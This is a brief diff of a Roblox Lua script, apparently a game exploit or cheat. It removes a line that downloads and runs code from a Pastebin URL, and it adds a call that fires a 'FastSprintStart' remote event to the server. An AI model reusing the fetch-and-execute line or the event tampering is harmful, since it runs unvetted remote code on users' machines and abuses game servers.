@@ -1,1 +1,6 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/ntUNkG5h'))()
+local args = {
+    [1] = "FastSprintStart",
+    [2] = false
+}
+
+game:GetService("Players").LocalPlayer.Character.Character.input:FireServer(unpack(args))
